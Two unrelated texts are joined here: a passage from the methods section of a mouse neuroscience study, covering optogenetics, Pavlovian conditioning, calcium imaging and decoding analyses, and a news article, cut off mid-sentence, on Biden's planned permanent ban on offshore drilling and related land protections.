(0.2 mm per minute) directly above the injection site after a slow pre-track was made with a 26-gauge blunt needle (until 0.4 mm above the target DV coordinate). Once in place, the craniotomy was closed with a low toxicity silicone adhesive (kwik-sil) and the lens was secured to the skull using dental cement (Superbond C&B kit).\n\nOptogenetics\n\nEach animal was unilaterally injected with 500 nl of cre-inducible AAV5-EF1a-DIO-hChR2(H134R)-eYFP, AAV5-EF1a-DIO-eNpHR-eYFP, or AAV5-EF1a-DIO-eYFP (UNC vector core) into the right NAc (AP: 1.45 mm, ML: 0.6 mm, DV: 4.5 mm) using a Nanojet III Injector (Drummond Scientific, USA) at a rate of 1 nl per second. The injection pipette was left in place for 10 min post-injection before it was removed. After the injection, a 0.2-mm-diameter optic fiber (Thorlabs) was slowly lowered into the right mouse NAc directly above the injection site (until 0.4 mm above the target DV coordinate). Once in place, the fiber was secured to the skull using dental cement (Superbond C&B kit).\n\nAt the end of the surgical procedure, mice were removed from the stereotaxic frame and postoperative care was carried out by administering analgesia (0.05mg kg-1 buprenorphine) 6 h post-procedure, as well as once every 24 h during three successive days. Animals were let to recover for 6 weeks before imaging recordings.\n\nBehavioral experiments\n\nBehavioral apparatus\n\nBehavioral sessions were performed in a custom-made operant chamber using pyControl software and hardware (17.8 cm length \u00d7 19 cm width \u00d7 23 cm height) within a sound-attenuating box. For appetitive stimulus (sucrose), the chamber was composed by a central magazine, to provide access to 15 \u03bcl of sucrose solution (20% wt/vol in water) delivered by a solenoid (for liquid dispenser), a cue-sound (70 dB 5-kHz), a house-light (100 mA, 2.8 W) installed on the top and metallic floor. For the aversive stimulus (shock), the chamber contained a house-light (100 mA, 2.8 W) installed on the top of the chamber, a cue-sound (80 dB 2-kHz) and a cue-light installed in one side wall and a gridded floor with shocker. A computer was used to control the equipment and record the data and a webcam (CMOS OV2710, ELP, Shenzhen, China) was used to acquire video.\n\nExposure to distinct USs\n\nAppetitive USs\n\nSucrose (US1)\n\nAfter 3 days of habituation to the behavioral box and the miniscope, mice (n D1-cre = 15, n A2A-cre = 12) were exposed to 1 session of sucrose consumption, in which 15ul of a 20% sucrose solution were delivered every 30 seconds, for 20 minutes.\n\nCondensed milk (US3)\n\nAfter sucrose session, mice (n D1-cre = 7, n A2A-cre = 6) were exposed to 1 session of condensed milk consumption, in which 15ul of a condensed milk solution (10% sugar) were delivered every 30 s, for 30 min.\n\nAversive USs\n\nFoot Shock (US2)\n\nThe same mice were familiarized to the aversive chamber apparatus for 3 days for 10 min with the patch cable connected. The foot shock session consisted of the unpredictable delivery of 7 mild foot shocks (0.5 mA, 1 s), separated by a random ITI (35\u201350 s).\n\nTail Lift (US4)\n\nMice were placed in an open arena covered with corn cob bedding and were allowed to explore the arena for 10 min. After that, a manual lift to the tail was applied with an interval of 30 s for 5 times.\n\nAppetitive Pavlovian conditioning\n\nAll animals performed first the appetitive Pavlovian conditioning (protocol adapted from56) and posteriorly the aversive Pavlovian conditioning. After sucrose consumption session, mice started the appetitive Pavlovian conditioning in which a conditioned stimulus (CS1) consisting of a 70 dB 5-kHz tone and a house-light (100 mA, 2.8 W) was turned on for 10 seconds; 15 ul of 20% sucrose solution (unconditioned stimulus, US1) was made available at the 7th second after CS onset. CS-US pairings were repeated 30 times per session, with a variable inter-trial interval (ITI) of 15\u201335 s (randomly assigned). Mice underwent a total of 10 sessions of appetitive Pavlovian conditioning. The behavior apparatus and the sucrose receptacle were disinfected with 10% ethanol between animals to remove any odor. For all sessions, nose poke and licks (for half of the animals, as in one set the animals the lickometer was not properly working) data and imaging recordings were simultaneously obtained and synchronized through pyControl and IDAS (Inscopix) systems. To quantify CS-triggered behavior, number of nose pokes in the sucrose port were recorded during CS presentation; nose pokes and licks were also registered during the ITI period. Additionally, the area under the curve (AUC) was calculated for the ITI period and for the CS period using the Python package Scikit-learn (function sklearn.metrics.auc).\n\nUnexpected reward omission and extinction sessions\n\nIn an additional session, animals were subjected to an unexpected reward omission session, in which reward was omitted in 25% of the trials (8/30 trials, randomly assigned). This session was followed by 3 extinction sessions, one session per day, in which CS1 was presented but no sucrose was given.\n\nAversive Pavlovian conditioning\n\nAfter habituation to the chamber, mice started a 3-day aversive Pavlovian conditioning protocol. All sessions started with 60 s of habituation period, with the house light on. The CS2 consisted of an 80 dB, 2-kHz tone plus a cue light, paired with a mild foot shock (0.5 mA, over 1 s) (US2). During the first conditioning session, mice were exposed to 10 CS-US pairings. Each trial consisted of a random ITI (35\u201350 s) followed by a 10 s tone, which was immediately followed by electric foot shock delivered through the stainless-steel grid floor. All sessions were recorded with webcams. The freezing response was defined as the time (seconds) that mice spent immobile (lack of any movement including sniffing) except respiration during the CS period and calculated as percentage of total cue time ((freezing time \u00d7100)/cue duration). To assess CS-triggered conditioned responses, two researchers evaluated freezing behavior during the CS period from all sessions in a blind manner. Since no differences between observers were detected, only data from one observer is presented in the manuscript. Researchers that performed freezing analysis were blind to group and condition.\n\nUnexpected shock omission and extinction sessions\n\nIn an additional session, animals were subjected to an unexpected shock omission session, in which shock was omitted in 25% of the trials (4/12 trials, randomly assigned). This session was followed by 9 days of extinction, in which CS2 was presented but no shock was delivered.\n\nOptogenetic manipulation\n\nFor all optogenetic experiments using ChR2 for optical excitation, 5 mW of blue light (at the tip of the fiberoptic) was generated by 473 nm DPSS laser (CNI Laser, Changchun, China) and unilaterally delivered to mice through fiberoptic patch cords (0.22NA, 200 \u03bcm diameter; Thorlabs, Newton, NJ, USA) that were attached to the implanted ferrule. For optogenetic experiments using eNpHR for optical inhibition, 5 mW of yellow light (at the tip of the fiberoptic) was generated by 589 nm DPSS laser (CNI Laser, Changchun, China) and unilaterally delivered as above. Laser output was controlled using a pulse generator (Master-8; AMPI, New Ulm, MN, USA) to deliver light.\n\nOptogenetic manipulation of D1- or D2-MSNs was time-locked to cue onset on each trial and lasted the entire period of the cue (10 s). Stimulation was performed during the conditioning day (Supplementary Fig. 10) or during the nine days of extinction (Fig. 7).\n\nAversive Pavlovian conditioning with optogenetic manipulation\n\nModulation during the conditioning session\n\nThe same protocol as the one described above was performed, with optical inhibition (10 s of constant light 5 mW at the tip of the fiber) being paired with CS2.\n\nModulation during the extinction phase\n\nMice were exposed to a conditioning session like the one described above. On the extinction sessions optical manipulation (excitation: 25 ms light pulses of 20 Hz for 10 s; optical inhibition: 10 s of constant light 5 mW at the tip of the fiber) was paired with CS2 presentation, with no foot shock being delivered. Mice were exposed to 9 identical extinction sessions with optical manipulation.\n\nLocomotor activity with optogenetic manipulation\n\nLocomotor activity was evaluated in an open field arena (43.2 cm \u00d7 43.2 cm) with transparent acrylic walls and white floor (Med Associates Inc., St. Albans, VT, USA). Briefly, mice were attached to an optical fiber connected to a laser (473 nm or 589 nm) and immediately placed in the center of the arena. Locomotion was monitored online over a period of 10 minutes (stimulation was given similarly as in the aversive Pavlovian conditioning: 10 s of light stimulation followed by a 50 s no stimulation interval). Distance traveled during the 10-minute session was automatically detected using the Activity Monitor software (Med Associates Inc., St. Albans, VT, USA), through real-time tracking of the animal\u2019s position by an infra-red tracking system mounted on the bottom of all walls of the arena. used as indicator of locomotor activity. Average of all stimulation (0\u201310 s) and post-stimulation (10\u201360 s) periods is presented.\n\nCalcium imaging acquisition\n\nGCaMP6f fluorescence signals were acquired using a miniaturized integrated fluorescence microscope system (nVoke, Inscopix, Palo Alto, CA) through GRIN lenses implanted in the NAc on freely behaving mice. Before each imaging session, the miniaturized microscope was attached to the baseplate, by gently restraining the mouse. The analog gain (3.2\u20136) and LED output power (0.8\u20131.5 mW) of the microscope were set to be constant for the same subject across imaging sessions. The microscope focus was adjusted such that the best dynamic fluorescence signals were at the focal plane, which was subsequently kept constant across imaging sessions. To synchronize behavioral events with imaging acquisition, the Data Acquisition Box of the Imaging system (Inscopix, Palo Alto, CA) was triggered by the pyControl behavioral software. Compressed gray scale images were then recorded at 20 frames per second and with spatial down sampling by a factor of 4. Timestamp of each video frame was synchronized with and recorded by the pyControl behavioral acquisition system. Calcium imaging videos were acquired during the sucrose and shock sessions, during every day of the appetitive Pavlovian conditioning for half of the animals, while the remaining animals were recorded on days 1, 2, 3, 4, 5, 6, 7 and 10. For the aversive Pavlovian conditioning, we registered all days. The number of neurons recorded in each animal is depicted in Supplementary Table 1.\n\nCalcium imaging data processing\n\nData preprocessing\n\nUsing the Inscopix Data Processing Software (IDPS), we performed a field of view cropping to remove marginal areas and fixed this region for all recording session for each animal. Subsequently, using IDPS, we applied a low-pass filter for noise reduction and a first motion correction using standard IDPS settings, exporting the result as a single TIFF image stack. Next, we applied a second motion correction using the CaImAn toolbox in Python, which incorporates the NoRMCorre algorithm. This algorithm performs a fast non-rigid motion correction that collectively optimizes artifact removal caused by movements. Following these corrections, we used the extended constrained non-negative matrix factorization developed for one-photon analysis (CNMF-E) in CaImAn to perform source separation (automatic identification of regions of interest (ROIs)) and obtain denoised and deconvolved fluorescence temporal activity, termed F. This, combined with a custom Python script that estimates the noise level of temporal traces (F 0 ) through the CaImAn internal function GetSn, yielded the normalized signals, termed \u2206F/F 0 . Subsequently, we manually inspected all automatically detected ROIs to eliminate irregular shapes or noisy calcium activity and to confirm that the identified ROIs corresponded to cells. Examples of ROIs and normalized signals obtained from a field of view, after cropping to remove marginal areas, are shown in Fig. 1D.\n\nCell registration\n\nAfter manual inspection, we extracted the spatial footprints of confirmed cells from CNMF-E for each session. Given a set of chronologically ordered sessions, we employed two methods for cell tracking: 1) CellReg61: a MATLAB script package that aligns spatial footprints across sessions using translation and rotation methods, with the first session as the reference map. For each cell pair, CellReg calculates a probability (P_same) of being the same cell, based on spatial correlations and centroid distance. Using default CellReg settings, a cell was considered tracked if P_same > 0.5; 2) Internal methods of the CaImAn toolbox: the register_multisession function uses spatial footprints of each cell and spatial correlation maps of each session to obtain an intersection over union metric for calculating distances between different cells in different sessions. It then solves a linear assignment problem using the Hungarian algorithm to determine the most likely cell pairings across sessions. Like CellReg, register_multisession uses the first session as the reference map. We adjusted the input parameters, setting the following variables \u201cmaximum distance considered\u201d to 0.9 and the \u201cmax distance between centroids\u201d to 100, providing greater flexibility compared to CellReg. We combined the results from both tracking methods and confirmed them through manual inspection.\n\nCalcium data analysis\n\nAlignment of activity to behavioral events\n\nSucrose and condensed milk\n\nThe occurrence of sucrose or condensed milk consumption events was defined as the detection of the first poke followed by a licking episode (1 licking episode was defined as having at least 2 lick events occurring less than 250 ms apart) in the behavior box within 10 s of sucrose delivery. This criterion ensured that events were accurately reflecting consumption. Since we observed a high correlation of the first poke with licking behavior, indicative of consumption, in the Pavlovian conditioning, activity data is aligned to the first poke after sucrose delivery. For each event, a 3-s window pre-event and a 3-s window post-event were analyzed.\n\nFoot shock exposure\n\nFor foot shock event, a 3-s window pre-foot shock and a 3-s window post-foot shock were analyzed.\n\nTail lift\n\nTail lifts were similarly marked with an external TTL signal triggered manually. For each tail lift, a 3-s window pre-TTL and a 3-s window post-TTL were analyzed.\n\nPermutation test\n\nTo classify the response of a cell to a stimulus, we analyzed changes in their average signal \u2206F/F_0. We used a permutation test where the fluorescence signal was shuffled across the 6-second window (3 s before and after stimulus presentation) 1000 times. If the absolute difference between the average pre- and post-stimulus signal in a real trial was statistically less 5% than observed in the 1000 shuffled data, the neuron was considered excited when the post-stimulus signals increased and inhibited when it decreased. Neurons with non-significant differences were classified as non-responsive.\n\nSignal normalization (z-score)\n\nFor subsequent analyses, we computed the z-score to represent the intensity of a cell\u2019s response to a stimulus (CS or US). The z-score is calculated as z(t) = (F(t) \u2212 F avg )/F SD , where F(t) represents the normalized fluorescence signal \u2206F/F 0 , and F Avg and F SD are the mean and standard deviation of \u2206F/F 0 measured across all 3-s pre-stimulus baselines in all trials, respectively. For trial-by-trial analyses, the z-score is computed using F avg and F SD measured only for the evaluated trial and in the 6 s immediately preceding the stimulus. In cases where the baseline contains only spurious activity, such as decay transients of the calcium signal or null activity, F SD is set to the standard deviation over all 6-second pre-stimulus baselines, which serves as the expected natural standard deviation.\n\nHeatmaps\n\nHeatmaps were constructed using the average z-score of individual cell activity using the seaborn package in Python (seaborn.heatmap). The interval was set from \u22123 to 3 s, where zero indicates the stimulus onset (CS or US). When heatmaps were shown for the activity of all cells recorded in each session for two stimuli, the responses were sorted in descending order based on the magnitude z-score of the first stimulus, and the same cell order was maintained for the heatmap of the second stimulus. When heatmaps were displayed for tracked cells, even for different sessions, the responses were aligned in descending order to the first stimulus of the first reference session. In all cases, the color bar was configured with \u2018extend\u2019 in seaborn.heatmap, indicating that the color scale extends beyond the upper and lower bounds of the data. The color scale was set to have an upper bound of 1.5 and a lower bound of \u22120.5 for the z-score.\n\nPSTHs and AUCs\n\nAfter classifying the cells responses to a stimulus, we constructed peristimulus time histograms (PSTHs) for each group of response types (excited, inhibited, and non-responsive). For each group, individual z-scores were averaged, and the mean with standard error of the mean (SEM) was plotted. Additionally, the AUC was calculated for each group during the 3 s following stimulus onset using the Python package Scikit-learn (function sklearn.metrics.auc). These methods were also applied to obtain PSTHs and AUCs for each cluster of cells based on their responses on day 1 of appetitive and aversive conditioning.\n\nPercentage of persisted responses\n\nAfter classifying a cell\u2019s response to a stimulus as excited, inhibited, or non-responsive based on the mean across trials in the permutation test, we calculated the percentage of persisted responses. This involved determining the fraction of trials in which the same response was obtained when the permutation test was applied to each single trial. We defined that >=70% of persisted responses indicates that the cell\u2019s response to the stimulus is consistent (Supplementary Fig. 2E, F).\n\nShannon\u2019s entropy\n\nTo assess the variability of neuronal responses to each stimulus, we used Shannon\u2019s entropy. For each presentation of the same stimulus, the resulting neuronal responses formed a series, which was subsequently utilized to calculate Shannon\u2019s entropy using the expression -\u03a3 i p(i)log 2 [p(i)], where p(i) denotes the probability of observing a specific type of response (e.g., excitatory, inhibitory, or non-responsive). In the most uncertain (random) scenario, where the neuron could produce any response for each stimulus presentation, p(i) = 1/3, resulting in an approximate maximum entropy of 1.58. Conversely, in the deterministic scenario, where the neuron consistently responds in the same manner for every stimulus presentation, the entropy is zero.\n\nSingle cell decoder analysis\n\nWe used the average z-score of the cell\u2019s 3-second response to each stimulus presentation for single-cell decoding analyses. Given a cell with M A trials responding to stimulus A and M B trials responding to stimulus B, we employed balanced datasets for training a linear SVM model (using sklearn.svm.LinearSVC in Python with C = 0.8). If M A is greater than M B , we randomly subsampled M B trials from M A . Otherwise, we randomly subsampled M A trials from M B . From the actual data, we used 70% of the trials for each stimulus for training and reserved the remaining 30% for machine accuracy testing. To generate the corresponding shuffled data, we conducted 100 permutations of the \u2206F/F 0 signal for each window from \u22126 to 3 s relative to stimulus onset. We then proceeded with the z-score calculation for trial-by-trial as described previously. This procedure was mirrored to create a classifier using the actual data to decode the shuffled data. Finally, we generated 1000 independent machines for both the actual test data and the shuffled data. The average of the accuracy test results on these machines represents the single cell decoder accuracy. In Fig. 3F, G, the decoding accuracy of each neuron (neuron ID on X axis) on day 1 was plotted following the color code of the accuracy (red - high, blue \u2013 low), and gray dots represent the decoding accuracy of those same neurons on day 5 (left) or day 10 (right). For Fig. 3H, I, neurons were divided into 20% best decoders, or 20% worst decoders based on day 1 activity.\n\nPopulation decoder analysis\n\nFor population-level decoding analyses, we use a population vector of size N, where N is the total number of cells responding to different stimuli. Each element in this vector represents the average z-score of a cell\u2019s 3-second response to a stimulus presentation. Each trial generates a unique population vector that serves as a representation of the presented stimulus. A stimulus presentation trial generates a population vector that represents that stimulus. Like the single-cell analysis, we ensured balanced datasets for the SVM model by selecting an equal number of population vectors from each stimulus category. As before, we selected an equal number of population vectors from each stimulus to generate datasets for the SVM model. This way, we allocated 70% of the population vectors for model training and the remaining 30% for machine accuracy testing. We generated 1000 independent machines for both the actual test data and the shuffled data. The average of the accuracy test results on these machines represents the population decoder accuracy.\n\nCorrelation analysis\n\nTo assess individual variability in response dynamics to the same stimulus within a single session, we constructed an M x M matrix for each neuron, where M is the number of trials for the same stimulus. Each element M ij of the matrix was computed as the Pearson correlation coefficient between the 3-second z-scored responses to the stimulus for trial i and trial j. The single neuron activity correlation was then derived as the mean of the elements located above the main diagonal of matrix M, representing the average Pearson correlation coefficient across all combinations of trial pairs. This is exemplified in Fig. 1L, M, which shows the distribution of this correlation for neurons for US1 and US2.\n\nIn addition to single neuron activity correlation, we also assessed the tuning curve correlation, which quantifies the similarity in response profiles of individual neurons to the same stimulus across multiple presentations within a session71. For each trial i, we constructed an N x T matrix of z-scores, where N is the number of neurons recorded from an animal and T is the number of time frames in the analysis period (3 s post-stimulus, acquired at 20 Hz, resulting in T = 60). The tuning curve correlation between trials i and j was then calculated as the median of the Pearson correlation coefficients between corresponding neurons across trials. Supplementary Fig. 2I illustrates how the tuning curve correlation changes on average as we compare trials with increasing separation (\u201cdistance between trials\u201d). For this figure, especially for sucrose consumption (US1), we only showed 13 consumptions per animal. This is because consumption varied between animals, and 13 represented the least common number of consumptions observed.\n\nTo evaluate the correlation in individual response dynamics to the same stimulus and across different sessions, for each tracked neuron, we calculated the Pearson correlation coefficient between the average signal of z-scored responses (3-second window) to the stimulus across distinct sessions. This assesses how consistently individual neurons respond to the same stimulus over time. For instance, in Supplementary Fig. 4I, J, the distributions of these correlations of all tracked neurons for different pairs of days during appetitive conditioning are shown, with the averages of the distributions of each pair being highlighted by vertical lines.\n\nFurthermore, we examined correlation between the CS-US stimuli at the population level. For each neuron, we averaged its responses across all trials and within a 3-s window for each stimulus. For example, this data is visualized in Supplementary Fig. 3D, E, where each data point represents an average response pair CS-US. To quantify the association between these paired responses, we calculated the Pearson correlation coefficient and performed linear regression to identify possible trends in the data. We also measured the angle between the closest points of each response pair. This metric, in the form of a histogram, allows from another perspective to compare the evolution of these data when analyzing different sessions. These analyses were not only performed on all neurons but also on a subset of \u201cCS-US responsive\u201d neurons identified through a permutation test. This approach allowed us to concentrate on neurons that showed significant activity changes in response to both stimuli.\n\nWe also evaluated the population vector correlation (PV correlation), which is a measure of similarity between multiple responses to the same stimulus across a neuronal population. This measure has been applied in detecting drift in overall activity patterns over time, comparing \u201cwithin-session\u201d (single session) and \u201cbetween-sessions\u201d (different sessions) correlations (for more details, see ref. 71). Briefly, for each stimulus (CS or US) and tracked neurons, we split each session into two blocks (first and second half of trials). For each neuron, we then averaged the z-scores across all frames within each block. In these blocks, a population vector is a set of average z-score values at a given frame, thus, a block is formed by an N \u00d7 T matrix, where N is the number of neurons and with T = 60 frames (3 s). We then calculate the PV correlation between pairs of blocks by averaging the Pearson correlation coefficients between their respective population vectors at each frame. When the two blocks are from the same session, the values of PV correlation are added to the \u201cwithin-session\u201d group, and when the blocks are from different sessions, the values of PV correlation are added to the \u201cbetween-sessions\u201d group. Finally, Fig. 3M, N displays the average values of these groups across animals for D1- and A2A-neurons.\n\nCluster analysis and representation\n\nFor cluster analysis, we concatenated the z-scores of the average activity over all trials from \u22123 to 3 s (where zero corresponds to stimulus onset) of both the CS and its corresponding US, totaling 12 s. Treating each timepoint (frame) as an independent dimension, we applied Principal Component Analysis (PCA, sklearn.decomposition.PCA function in Python) to a matrix of dimensions N x D, where N is the number of cells and D is the total number of dimensions. In our case, this resulted in 240 dimensions (12 s \u00d7 20 Hz, the sampling rate). Subsequently, we performed dimensionality reduction, selecting enough Principal Components (PCs) to account for at least 80% of the observed variance in our data (Supplementary Fig. 6A). This typically ranged from 12 to 15 PCs, which were then subjected to the K-means clustering method using the sklearn.cluster.KMeans function in Python. To determine the optimal number of clusters (n c ) for the reduced data, we varied n c from 2 to 10 and performed the following assessments: 1) Identified the n c that marked the onset of stability in the average cosine similarity computed between cluster elements and the average cluster activity (Supplementary Fig. 6B); 2) Identified the n c that yielded a peak in silhouette score analysis using the Euclidean metric (Supplementary Fig. 6C). The concordance of these two measures defined the n c to be employed in subsequent analyses. As an illustrative example, we examined the average z-scores of D1 neurons recorded on day 1 of appetitive conditioning, and this analysis revealed that n c = 3 was the optimal number of clusters for this dataset. To visualize the identified clusters, in Supplementary Fig. 6D, we utilized two dimensionality reduction techniques: PCA (a linear method) and t-Distributed Stochastic Neighbor Embedding (t-SNE, a non-linear method), and for both, we use the first two components, and each color represents a cluster.\n\nNeuronal trajectory\n\nTo investigate the evolution of neural activity patterns following positive and negative valence stimuli, we conducted neural trajectory analysis. This approach tracks changes in a tracked population response over time. For each tracked cell, we concatenated z-score of average activity across all trials within a 3-second window after stimulus onset. To analyze US1 and US2 in Fig. 1R, S, we generated a matrix of size N x 120 (2 stimuli, each comprising 60 frames). Similarly, to analyze CS1, CS2, US1, and US2 in Fig. 6G\u2013I, we generated a matrix of size N x 240. Each matrix was generated per animal, where N represents the number of cells. To visualize the overall activity dynamics, we reduced the matrix dimensionality to two principal components (PC) using PCA treating each cell as an independent dimension. We then smoothed these components using one-dimensional Gaussian convolution, resulting in neural trajectories shown as solid lines in these figures.\n\nTo quantify the dissimilarity between trajectories over time for different stimuli, we calculated the Euclidean distance between their corresponding PC values at each time point. Specifically, we computed distances between (PC1_EST1, PC2_EST1) and (PC1_EST2, PC2_EST2) at each time point, where EST corresponds to CS or US.\n\nFurthermore, we visualized single-trial variability by plotting individual trial trajectories as dashed lines (Fig. 1R, S and Fig. 6G\u2013I). These trajectories were obtained by applying the same PCA transformation matrix used for average activity data. Notably, we only plotted 7 trials per stimulus (the maximum number of trials for footshock) to maintain a balanced representation, similar to the population decoder analysis.\n\nSacrifice and brain sectioning for histological analysis\n\nAt the end of all behavior procedures, mice were deeply anesthetized by a mixture of ketamine/medetomidine. Animals were then transcardially perfused with 0.9% saline, followed by 4% paraformaldehyde (PFA) solution. After, whole heads with the lenses or the optic fibers attached were immersed for 48 h in 4% PFA so that the lens track is clearly visible for histological analysis. Next, brains were extracted and then rinsed and stored in 30% sucrose at 4 \u00b0C until sectioning.\n\nSectioning was performed coronally, in 40 \u03bcm slices, on a vibrating microtome (VT1000S, Leica, Germany) and slices were stored at 4 \u00b0C on 12-well plates (or long-term storage in cryoprotectant solution at \u221220 \u00b0C) until use. Slices from the area of interest (NAc) were selected using the Mouse Brain Atlas62.\n\nImmunohistochemistry\n\nTo assess GCaMPf6 expression in D1-cre and A2A-cre mice, brain slices containing NAc sections were washed with phosphate buffered saline (PBS), and then permeabilizated with PBS-Triton 0.3% (PBS-T 0.3%). Blocking was performed for 1 h using 5% Fetal Bovine Serum (FBS; Invitrogen, MA, USA) in PBS-T at RT. The primary antibody goat anti-GFP (1:750; ab6673, Lot 1033180-23, ABCAM, Cambridge, UK), was incubated overnight at 4 \u00b0C with agitation, followed by PBS-T washes and subsequent incubation with the secondary fluorescent antibody Alexa Fluor\u00ae 488 donkey anti-goat (1:500; A11055, Lot 2747580, Invitrogen, Carlsbad, CA, USA). All antibodies were diluted in PBS-T with 2% FBS. Slices were washed with PBS-T, incubated with 4\u2019,6-Diamidino-2-Phenylindole Dihydrochloride (DAPI, 1:1000; 62248, Thermo ScientificTM, Waltham, MA, USA) for nucleus staining, washed with PBS and mounted using Permafluor (Invitrogen, MA, USA). Slides were stored at 4 \u00b0C and kept protected from light.\n\nImage acquisition and analysis\n\nImages from the NAc of D1-cre and A2A-cre mice were collected in an inverted confocal microscope (Olympus FV3000, Tokyo, Japan). About 6 slices per animals were used for each analysis. Optic fiber placement was assessed to confirm if the activity detected was from the NAc region. For that, slices where the optic fiber was detected were classified according to the Mouse brain atlas62 to estimate the stereotaxic coordinates.\n\nStatistical analysis\n\nPart of the statistical analysis was performed in GraphPad Prism 9.0 (GraphPad Software, Inc., La Jolla, CA, USA). Prior to any statistical comparison between groups, normality was assessed in all data analyzed by using the Kolmogorov\u2013Smirnov (KS) test. Parametric tests were used whenever KS test >0.05. If normality assumptions were not met, non-parametric analysis (Mann\u2013Whitney or Wilcoxon test) was performed.\n\nFor behavior, two-way analysis of variance (ANOVA) for repeated measures was used to assess learning in D1- and A2A-cre mice (factors used: nose pokes during CS versus nose pokes during ITI, across days of training); and to analyze percentage (%) of freezing throughout the trials on day 1. Bonferroni\u2019s post hoc multiple comparison test was used for group differences determination. One Way ANOVA was done to compare the poke probability at the ITI or CS period on days 1, 5 and 10 of learning in the appetitive Pavlovian conditioning task. One Way ANOVA was also done to compare the latency to compare the time between delivery of the reward and the first poke on days 1, 5 and 10 of training. Statistical analysis between two time-points was made using two-tailed paired Student\u2019s t test, to compare percentage of freezing in the first and last trials of the aversive conditioning. Two-way ANOVA for repeated measures was performed to compare the percentage of freezing across days of shock extinction.\n\nData are presented as mean \u00b1 standard error of mean (SEM). Statistical significance was considered for p \u2264 0.05. All statistical data of the main figures are depicted in Supplementary Table 2. All statistical data of the Supplementary figures are depicted in Supplementary Table 3.\n\nReporting summary\n\nFurther information on research design is available in the Nature Portfolio Reporting Summary linked to this article.",

(Erin Schaff/The New York Times)\n\nPresident Joe Biden is expected to permanently ban new oil and gas drilling in large sections of the Atlantic and Pacific oceans, as well as other federal waters, in a way that could be difficult for the Trump administration to unwind, according to two people familiar with the plans.\n\nBiden intends to invoke an obscure provision of a 1953 law, the Outer Continental Shelf Lands Act, that would give him wide latitude to withdraw federal waters from future oil and gas leasing, said the people. They spoke on the condition of anonymity because they were not authorized to discuss the policy publicly.\n\nThe ban would be a significant victory for environmental advocates who have long argued that new drilling is inconsistent with the need to sharply reduce greenhouse gas emissions from burning oil and gas that are dangerously warming the planet. The year that just ended was the hottest in recorded history.\n\nThe move would also cement Biden\u2019s legacy on climate change as he prepares to leave the White House after a single term. President-elect Donald Trump has pledged to reverse virtually every law and regulation aimed at curbing carbon dioxide emissions, and to make it easier for companies to produce and burn more coal, oil and gas.\n\nWhile section 12(a) of the Outer Continental Shelf Lands Act gives a president wide leeway to bar drilling, it does not include language that would allow Trump or any future president to revoke a ban.\n\nThat was tested after President Barack Obama banned offshore drilling in parts of the Arctic Ocean and dozens of canyons in the Atlantic Ocean. During his first term in office Trump tried to revoke the ban. In 2019, U.S. District Judge Sharon Gleason in Alaska ruled that Obama\u2019s ban could not be undone without an act of Congress.\n\nThe order could box in Trump politically as well. One area Biden intends to permanently protect is a stretch of coastal waters from North Carolina to Florida, according to the two people knowledgeable about the plan. Trump had imposed a 10-year moratorium on oil and gas exploration in that region by using the Outer Continental Shelf Lands Act. He took that step while he was courting voters in those states during his unsuccessful bid for reelection in 2020.\n\nThe White House declined to comment.\n\nKaroline Leavitt, a spokesperson for Trump, accused the Biden administration of waging a \u201cwar on American energy.\u201d\n\n\u201cWhen he takes office, President Trump will make America energy dominant again, protect our energy jobs, and bring down the cost of living for working families,\u201d Leavitt said in a statement.\n\nThe ban was first reported by Bloomberg.\n\nEnvironmental groups praised the expected move. Activists and congressional Democrats have urged Biden to permanently withdraw all waters that are not under lease from drilling not only because of climate concerns but also because of worries about potential oil spills and other ecological damage.\n\nThe order, which could come as early as Monday, is not expected to be as expansive as some lawmakers had hoped. But in addition to sections of the Atlantic and Pacific oceans, it also could offer new protections to deep waters in the Eastern Gulf of Mexico, according to one person who had been briefed on parts of the plan.\n\n\u201cRestricting offshore drilling is a big win for the climate, marine wildlife, coastal communities and economies, and would be yet another chapter in President Biden\u2019s historic climate legacy,\u201d said Ben Jealous, executive director of the Sierra Club.\n\nJoseph Gordon, the campaign director for climate and energy at Oceana, a conservation group, noted that Republican lawmakers in many coastal states have also sought to protect their coastlines from drilling, and held out the possibility that there could be some bipartisan support for Biden\u2019s order.\n\n\u201cOur coastlines are home to millions of Americans and support billions of dollars of economic activity that depend on a healthy coast, abundant wildlife, and thriving fisheries,\u201d he said.\n\nDustin Myers, the senior vice president of policy at the American Petroleum Institute, which represents U.S. oil and gas companies, said in a statement that voters in November \u201cclearly rejected this misguided approach.\u201d\n\nOil and gas companies \u201clook forward to working with the incoming administration to bring the benefits offshore oil and natural gas production provides to the United States through jobs, investment and domestic energy security,\u201d he said.\n\nWhite House officials began discussing a widespread offshore drilling ban about two years ago amid pressure from activists for Biden to declare a climate emergency, according to one of the people knowledgeable about the plan. Internally, several people argued that while such a declaration would be symbolic, it would be more meaningful to make some federal waters off limits to drilling.\n\nThose talks took on greater urgency after Trump won the presidential election in November.\n\nIn his remaining time in office, Biden is shoring up his environmental legacy in other ways as his agencies rush to finalize grants and regulations to spur clean energy development.\n\nIn the coming days, the president intends to designate two new national monuments in California, protecting hundreds of thousands of acres of land from mining, logging and other development, according to three people familiar with the plans.\n\nThe first, to be known as the Chuckwalla National Monument, would encompass more than 600,000 acres from the Coachella Valley near the Salton Sea to the Colorado River, as well as about 17,000 acres along Joshua Tree National Park. Torres Martinez Desert Cahuilla Indians and other Native tribes have led the effort to protect the land, arguing that it is home to several native and endangered species as well as a region that is spiritually and culturally significant.\n\nSeparately, an area of land in Northern California around Mount Shasta is expected to be declared the S\u00e1tt\u00edtla National Monument. Tribes and environmental groups said the region, which includes natural reservoirs that discharge more than 1.2 million acre-feet of snowmelt each year, providing drinking water to millions of Californians, has faced threats from mining, logging and other industrial activities.\n\nThis week, the Interior Department took steps to bar oil, gas and geothermal development for 20 years in Nevada\u2019s high alpine Ruby Mountains. The move could protect about 264,000 acres of federal lands in the area from leasing. But because the proposal requires a 90-day public comment period before it can be finalized, the Trump administration would make any final decisions about future development on the land.\n\nSeparately, the Interior Department finalized a 20-year ban on mining and geothermal leasing across more than 20,000 acres in the Black Hills National Forest in South Dakota. The area is the traditional homeland to several Native tribes and the Pactola Reservoir-Rapid Creek Watershed provides a critical source of drinking water for nearby Rapid City.\n\nIt also signed a $100 million deal with the state of Wyoming to buy land within Grand Teton National Park and protect it from being turned into luxury condominiums. The land, known as the Kelly parcel, is a migration corridor for pronghorn and elk and has sweeping views of the Teton Range.\n\nSen. John Barrasso, R-Wyo., praised his state\u2019s Republican governor for negotiating what he called a \u201cfair deal.\u201d But he criticized other moves by Biden in his final weeks as \u201cmalicious and misguided\u201d eleventh-hour regulations.\n\n\u201cSenate Republicans are ready to work with President Trump to undo these harmful Washington regulations handcuffing hard working 